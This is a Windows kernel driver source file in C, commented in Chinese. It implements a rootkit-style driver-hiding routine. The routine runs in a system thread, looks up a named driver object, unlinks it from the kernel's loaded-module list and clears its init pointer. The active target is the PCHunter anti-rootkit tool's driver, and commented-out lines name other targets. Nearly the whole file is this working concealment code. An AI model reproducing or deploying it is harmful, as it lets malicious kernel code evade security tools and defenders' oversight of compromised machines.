#include <ntifs.h>

typedef struct _KLDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY exp;
	ULONG un;
	ULONG NonPagedDebugInfo;
	ULONG DllBase;
	ULONG EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT __Undefined5;
	ULONG  __Undefined6;
	ULONG  CheckSum;
	ULONG  TimeDateStamp;
} KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;

NTKERNELAPI NTSTATUS ObReferenceObjectByName(
	__in PUNICODE_STRING ObjectName,
	__in ULONG Attributes,
	__in_opt PACCESS_STATE AccessState,// 访问权限可以写0 写0完全访问不受控制FILE_ALL_ACCESS,
	__in_opt ACCESS_MASK DesiredAccess,
	__in POBJECT_TYPE ObjectType,//对象类型
	__in KPROCESSOR_MODE AccessMode, //内核模式 有三种模式 enum 类型
	__inout_opt PVOID ParseContext,
	__out PVOID* Object //输出对象 我们要得到的驱动对象
);


extern POBJECT_TYPE* IoDriverObjectType;


void DriverHide(PWCH ObjName)
{
	LARGE_INTEGER in = { 0 };
	in.QuadPart = -10000 * 5000;
	KeDelayExecutionThread(KernelMode, FALSE, &in);//等待
	UNICODE_STRING driverName1 = { 0 };
	RtlInitUnicodeString(&driverName1, ObjName);//传入驱动的名字
	PDRIVER_OBJECT Driver = NULL;//初始化驱动对象
	NTSTATUS status = ObReferenceObjectByName(&driverName1, FILE_ALL_ACCESS, 0, 0, *IoDriverObjectType, KernelMode, NULL, &Driver);//通过驱动的到驱动的对象

	if (NT_SUCCESS(status))//判断
	{
		PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)Driver->DriverSection;//驱动对象结构.可以解析为_LDR_DATA_TABLE_ENTRY是一个链表存储着下一个驱动对象  
		DbgPrintEx(77, 0, "[db]: driver name = %wZ\r\n", &ldr->FullDllName);//输出名字
		Driver->DriverSection = ldr->InLoadOrderLinks.Flink;
		RemoveEntryList(&ldr->InLoadOrderLinks);//去除双向链表中的值
		Driver->DriverInit = NULL;
		ObDereferenceObject(Driver);//删除刚刚的到的驱动对象
	}
	return;
}


VOID DriverUnload(PDRIVER_OBJECT pDriver)
{
	pDriver;
	DbgPrint("END\r\n");//卸载
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)
{
	pReg;
	HANDLE hThread = NULL;
	//NTSTATUS status = PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, DriverHide, L"\\driver\\PCHunter32as");
	//NTSTATUS status = PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, DriverHide, L"\\driver\\DriverHide");
    NTSTATUS status = PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, DriverHide, L"\\driver\\PCHunter64as");
	if (NT_SUCCESS(status))
	{
		NtClose(hThread);
	}
	pDriver->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
}
